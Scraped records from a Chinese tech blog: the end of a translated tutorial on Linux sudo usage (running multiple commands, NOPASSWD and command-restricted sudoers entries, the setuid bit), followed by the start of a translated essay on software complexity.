class=\"crayon-v\">tee</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93302835827461940-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0034 seconds] -->\r\n<p>上述命令中：</p>\n<ul>\n<li>冒号 (<code>:</code>) 表明我们处于 Vim 的退出模式</li>\n<li>感叹号 (<code>!</code>) 表明我们正在运行 shell 命令</li>\n<li><code>sudo</code> 和 <code>tee</code> 都是 shell 命令</li>\n<li>百分号 (<code>%</code>) 表明从当前行开始的所有行</li>\n</ul>\n<h4 id=\"toc_11\">使用 sudo 执行多个命令</h4>\n<p>至今我们用 <code>sudo</code> 只执行了单个命令，但我们可以用它执行多个命令。只需要用分号 (<code>;</code>) 隔开命令，如下所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93302838233365486\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo -- bash -c 'pwd; hostname; whoami'\r\n\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93302838233365486-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93302838233365486-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93302838233365486-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93302838233365486-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sudo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'pwd; hostname; whoami'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93302838233365486-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa93302838233365486-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>上述命令中</p>\n<ul>\n<li>双连字符 (<code>--</code>) 停止命令行切换</li>\n<li><code>bash</code> 表示要用于执行命令的 shell 名称</li>\n<li><code>-c</code> 选项后面跟着要执行的命令</li>\n</ul>\n<h4 id=\"toc_12\">无密码运行 sudo 命令</h4>\n<p>当第一次执行 <code>sudo</code> 命令时，它会提示输入密码，默认情形下密码被缓存 15 分钟。但是，我们可以避免这个操作，并使用 <code>NOPASSWD</code> 关键字禁用密码认证，如下所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9330283c299013798\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlinuxtechi ALL=(ALL) NOPASSWD: ALL\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9330283c299013798-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9330283c299013798-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9330283c299013798-1\"><span class=\"crayon-e\">linuxtechi </span><span class=\"crayon-v\">ALL</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ALL</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">NOPASSWD</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ALL</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9330283c299013798-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h4 id=\"toc_13\">限制用户执行某些命令</h4>\n<p>为了提供受控访问，我们可以限制 <code>sudo</code> 用户只执行某些命令。例如，下面的行只允许执行 <code>echo</code> 和 <code>ls</code> 命令 。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9330283f199996942\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlinuxtechi ALL=(ALL) NOPASSWD: /bin/echo /bin/ls\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9330283f199996942-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9330283f199996942-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9330283f199996942-1\"><span class=\"crayon-e\">linuxtechi </span><span class=\"crayon-v\">ALL</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ALL</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">NOPASSWD</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">ls</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9330283f199996942-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p></p>\n<h4 id=\"toc_14\">深入了解 sudo</h4>\n<p>让我们进一步深入了解 <code>sudo</code> 命令。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93302842807039342\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ls -l /usr/bin/sudo\r\n-rwsr-xr-x 1 root root 145040 Jun 13  2017 /usr/bin/sudo\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93302842807039342-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93302842807039342-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93302842807039342-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93302842807039342-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sudo</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93302842807039342-2\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rwsr</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">xr</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">145040</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jun</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">13</span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2017</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">sudo</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93302842807039342-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>如果仔细观察文件权限，则发现 <code>sudo</code> 上启用了 setuid 位。当任何用户运行这个二进制文件时，它将以拥有该文件的用户权限运行。在所示情形下，它是 root 用户。</p>\n<p>为了演示这一点，我们可以使用 <code>id</code> 命令，如下所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93302846738206472\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ id\r\nuid=1002(linuxtechi) gid=1002(linuxtechi) groups=1002(linuxtechi)\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93302846738206472-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93302846738206472-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93302846738206472-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93302846738206472-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">id</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93302846738206472-2\"><span class=\"crayon-v\">uid</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1002</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">gid</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1002</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">groups</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1002</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93302846738206472-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>当我们不使用 <code>sudo</code> 执行 <code>id</code> 命令时，将显示用户 <code>linuxtechi</code> 的 id。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93302849260981167\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo id\r\nuid=0(root) gid=0(root) groups=0(root)\r\n\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93302849260981167-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93302849260981167-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93302849260981167-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93302849260981167-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93302849260981167-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">id</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93302849260981167-2\"><span class=\"crayon-v\">uid</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">gid</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">groups</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93302849260981167-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93302849260981167-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>但是，如果我们使用 <code>sudo</code> 执行 <code>id</code> 命令时，则会显示 root 用户的 id。</p>\n<h3 id=\"toc_15\">结论</h3>\n<p>从这篇文章可以看出 —— <code>sudo</code> 为普通用户提供了更多受控访问。使用这些技术，多用户可以用安全的方式与 GNU/Linux 进行交互。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113912\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113912votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113912\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux", "url": "http://blog.jobbole.com/113912/", "url_obj_id": "0d352bb0afad005f2b826e5ebae297ef"}
{"front_img_url": ["http://ww3.sinaimg.cn/mw690/7cc829d3gw1ezy0oepjyrj21hc0u0wk6.jpg"], "title": "软件复杂性正在杀死我们", "create_date": "2018/04/14 ·", "praise_num": 2, "fav_num": 5, "comment_num": 2, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/wx138099575\">风木</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://www.simplethread.com/software-complexity-killing-us/\">Justin Etheredge</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>代码量少了不代表软件的复杂度降低了，而是编程语言的表达力更强了。太多开发人员痴迷于框架，过度追求软件灵活性、可组合性等等，而忘记自己是不是真的需要这些。</p>\n<hr>\n<p><img class=\"alignnone\" src=\"http://ww3.sinaimg.cn/mw690/7cc829d3gw1ezy0oepjyrj21hc0u0wk6.jpg\" width=\"690\" height=\"388\"></p>\n<p>在有软件之前，只有黑暗。自从时代的黎明到来后，一直存在一个不变的事实：企业想要构建价格更低、运行更快的软件。</p>\n<p>当然，这是可以理解并且值得称赞的目标——尤其是你曾经花费时间跟软件开发人员打过交道。每个工程师都应该全心支持此目标，并且在当前环境的约束下，应该始终努力尽可能有效率地创造产品。</p>\n<p>然而，事实上，我们经常做不到这一点。并非故意为之，只是随着时间流逝，在构建软件时会因为意料之外的复杂性而陷入困境，因此自我训练以寻找边界案例、差距分析以及所有可能起源于同一个需求要点的隐藏故障。</p>\n<p>我们被大量的复杂度以及设计优雅解决方案的精神执念所迷惑：另一层抽象！干起来！分离相关量！继承构成！这也是可以理解的，但是在这个过程中，我们经常忽略正在被解决的业务问题，忘记管理复杂度是软件开发人员<strong>次重要</strong>的责任。</p>\n<p><strong>为什么会造成现在这样的局面？</strong></p>\n<h3>软件在某些方面上已经变得更加简单了</h3>\n<p>在过去的几十年里，软件产业非常成功地降低了编写大多数软件所需要的自定义代码量。</p>\n<p>这种减少大部分是通过使编程语言更有表现性来实现的。像 Python、Ruby 或 JavaScript 这些语言可以用<strong>不到 </strong>C 语言<strong>三分之一的代码</strong>来实现相似的功能。使用 C 